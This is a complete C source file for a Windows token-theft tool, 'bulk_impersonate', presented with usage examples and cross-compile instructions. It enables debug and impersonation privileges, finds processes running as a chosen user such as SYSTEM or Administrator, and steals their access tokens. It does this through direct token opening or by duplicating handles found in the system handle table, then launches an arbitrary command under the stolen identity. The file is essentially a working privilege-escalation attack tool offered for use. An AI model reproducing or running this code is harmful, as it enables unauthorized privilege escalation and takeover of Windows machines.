/*
 * bulk_impersonate.c
 *
 * Targets a specific user identity (by SID, username, or substring) and
 * iterates through all processes running as that user until a token can
 * be stolen and used to launch a command.
 *
 * Token acquisition strategy (per process):
 *   1. OpenProcessToken with TOKEN_DUPLICATE
 *   2. Fallback: OpenProcess(PROCESS_DUP_HANDLE) + system handle table
 *      scan for token handles inside the target
 *
 * Usage:
 *   bulk_impersonate.exe <user_filter> <command>
 *   bulk_impersonate.exe SYSTEM cmd.exe
 *   bulk_impersonate.exe S-1-5-18 whoami.exe
 *   bulk_impersonate.exe "NETWORK SERVICE" cmd.exe
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc -o bulk_impersonate.exe bulk_impersonate.c -ladvapi32
 */

#include <windows.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── ntdll types ───────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16

typedef struct {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG                NumberOfHandles;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
static NtQuerySystemInformation_t pNtQuerySystemInformation;

static void init_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll)
        pNtQuerySystemInformation = (NtQuerySystemInformation_t)
            GetProcAddress(ntdll, "NtQuerySystemInformation");
}

/* ── helpers ───────────────────────────────────────────────────────── */

static BOOL enable_priv(const char *name) {
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) { CloseHandle(tok); return FALSE; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    BOOL ok = GetLastError() == ERROR_SUCCESS;
    CloseHandle(tok);
    return ok;
}

static PSID get_token_user_sid(HANDLE tok) {
    DWORD len = 0;
    GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    if (!len) return NULL;
    TOKEN_USER *tu = malloc(len);
    if (!tu) return NULL;
    PSID copy = NULL;
    if (GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        DWORD slen = GetLengthSid(tu->User.Sid);
        copy = malloc(slen);
        if (copy) CopySid(slen, copy, tu->User.Sid);
    }
    free(tu);
    return copy;
}

/* Case-insensitive substring */
static BOOL istrstr(const char *hay, const char *needle) {
    if (!hay || !needle) return FALSE;
    size_t hlen = strlen(hay), nlen = strlen(needle);
    char h[512], n[512];
    if (hlen >= sizeof(h)) hlen = sizeof(h) - 1;
    if (nlen >= sizeof(n)) nlen = sizeof(n) - 1;
    for (size_t i = 0; i < hlen; i++) h[i] = (char)tolower(hay[i]);
    h[hlen] = '\0';
    for (size_t i = 0; i < nlen; i++) n[i] = (char)tolower(needle[i]);
    n[nlen] = '\0';
    return strstr(h, n) != NULL;
}

/* Check if a process token's user matches the filter (SID string, username, or substring) */
static BOOL token_matches_filter(HANDLE tok, const char *filter) {
    PSID sid = get_token_user_sid(tok);
    if (!sid) return FALSE;

    BOOL match = FALSE;

    /* Check SID string */
    char *sid_str = NULL;
    if (ConvertSidToStringSidA(sid, &sid_str)) {
        if (istrstr(sid_str, filter)) match = TRUE;
        LocalFree(sid_str);
    }

    /* Check DOMAIN\user and bare username */
    if (!match) {
        char name[256] = {0}, domain[256] = {0}, full[512];
        DWORD nlen = sizeof(name), dlen = sizeof(domain);
        SID_NAME_USE use;
        if (LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use)) {
            _snprintf(full, sizeof(full), "%s\\%s", domain, name);
            if (istrstr(full, filter) || istrstr(name, filter))
                match = TRUE;
        }
    }

    free(sid);
    return match;
}

static void describe_token_user(HANDLE tok) {
    PSID sid = get_token_user_sid(tok);
    if (!sid) return;
    char name[256] = {0}, domain[256] = {0};
    DWORD nlen = sizeof(name), dlen = sizeof(domain);
    SID_NAME_USE use;
    char *sid_str = NULL;
    LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use);
    ConvertSidToStringSidA(sid, &sid_str);
    printf("    Identity: %s\\%s (%s)\n", domain, name, sid_str ? sid_str : "?");
    if (sid_str) LocalFree(sid_str);
    free(sid);
}

/* ── Token acquisition strategies ──────────────────────────────────── */

/* Strategy 1: direct OpenProcessToken */
static HANDLE try_direct(DWORD pid) {
    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return NULL;

    HANDLE tok = NULL;
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        CloseHandle(proc);
        return NULL;
    }

    HANDLE primary = NULL;
    DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
                     SecurityImpersonation, TokenPrimary, &primary);
    CloseHandle(tok);
    CloseHandle(proc);
    return primary;
}

/* Strategy 2: handle table scan */
static HANDLE try_handle_scan(DWORD pid, SYSTEM_HANDLE_INFORMATION *shi,
                              const char *filter) {
    if (!shi) return NULL;

    HANDLE proc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!proc) return NULL;

    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
        if (e->ProcessId != pid) continue;

        HANDLE dup = NULL;
        if (!DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
                GetCurrentProcess(), &dup,
                TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, 0))
            continue;

        TOKEN_TYPE tt;
        DWORD len;
        if (!GetTokenInformation(dup, TokenType, &tt, sizeof(tt), &len)) {
            CloseHandle(dup);
            continue;
        }

        /* Verify this token actually belongs to the target user */
        if (!token_matches_filter(dup, filter)) {
            CloseHandle(dup);
            continue;
        }

        HANDLE primary = NULL;
        if (DuplicateTokenEx(dup, MAXIMUM_ALLOWED, NULL,
                SecurityImpersonation, TokenPrimary, &primary)) {
            CloseHandle(dup);
            CloseHandle(proc);
            return primary;
        }
        CloseHandle(dup);
    }

    CloseHandle(proc);
    return NULL;
}

/* ── Pre-fetch system handle table ─────────────────────────────────── */

static SYSTEM_HANDLE_INFORMATION *fetch_handle_table(void) {
    if (!pNtQuerySystemInformation) return NULL;

    ULONG bufsize = 4 * 1024 * 1024;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS status;

    do {
        shi = realloc(shi, bufsize);
        if (!shi) return NULL;
        status = pNtQuerySystemInformation(SystemHandleInformation, shi, bufsize, NULL);
        if (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH)
            bufsize *= 2;
    } while (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) { free(shi); return NULL; }
    return shi;
}

/* ── main ──────────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    if (argc < 3 || strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
        printf("bulk_impersonate - Steal a token by targeting a user identity\n\n"
               "Usage: bulk_impersonate.exe <user_filter> <command>\n\n"
               "The user filter matches against SID, DOMAIN\\user, or username\n"
               "(case-insensitive substring). Iterates all processes running as\n"
               "that user until a token is successfully stolen.\n\n"
               "Examples:\n"
               "  bulk_impersonate.exe SYSTEM cmd.exe\n"
               "  bulk_impersonate.exe S-1-5-18 whoami.exe\n"
               "  bulk_impersonate.exe \"NETWORK SERVICE\" cmd.exe\n"
               "  bulk_impersonate.exe Administrator powershell.exe\n");
        return (argc < 3) ? 1 : 0;
    }

    const char *filter = argv[1];
    const char *cmd    = argv[2];

    init_ntdll();
    enable_priv("SeDebugPrivilege");
    enable_priv("SeImpersonatePrivilege");

    printf("[*] Target user: %s\n", filter);
    printf("[*] Command    : %s\n", cmd);
    printf("[*] Fetching system handle table...\n");

    SYSTEM_HANDLE_INFORMATION *shi = fetch_handle_table();
    if (shi)
        printf("    %lu handles cached\n", shi->NumberOfHandles);
    else
        printf("    Handle table unavailable (direct method only)\n");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        free(shi);
        return 1;
    }

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        free(shi);
        return 1;
    }

    DWORD my_pid = GetCurrentProcessId();
    int tried = 0, matched = 0;

    printf("[*] Scanning processes...\n\n");

    do {
        if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4 ||
            pe.th32ProcessID == my_pid)
            continue;

        /* Quick check: can we even read this process's token to match the filter? */
        HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!proc) continue;

        HANDLE qtok = NULL;
        BOOL filter_match = FALSE;
        if (OpenProcessToken(proc, TOKEN_QUERY, &qtok)) {
            filter_match = token_matches_filter(qtok, filter);
            CloseHandle(qtok);
        }
        CloseHandle(proc);

        if (!filter_match) continue;
        matched++;

        printf("  PID %-6lu %-22s ", pe.th32ProcessID, pe.szExeFile);

        /* Try to steal a usable token */
        HANDLE primary = try_direct(pe.th32ProcessID);
        if (primary) {
            printf("[direct] ");
        } else {
            primary = try_handle_scan(pe.th32ProcessID, shi, filter);
            if (primary)
                printf("[handle scan] ");
        }

        if (!primary) {
            printf("FAILED\n");
            tried++;
            continue;
        }

        /* Attempt to spawn */
        int wlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
        WCHAR *wcmd = malloc(wlen * sizeof(WCHAR));
        MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = {0};

        if (CreateProcessWithTokenW(primary, 0, NULL, wcmd,
                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("SUCCESS\n");
            describe_token_user(primary);
            printf("    Launched PID %lu: %s\n", pi.dwProcessId, cmd);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            free(wcmd);
            CloseHandle(primary);
            /* Done -- we only need one */
            break;
        }

        printf("spawn failed (err %lu)\n", GetLastError());
        free(wcmd);
        CloseHandle(primary);
        tried++;
    } while (Process32Next(snap, &pe));

    printf("\n[*] Matched %d process(es), tried %d\n", matched, tried);

    CloseHandle(snap);
    free(shi);
    return 0;
}
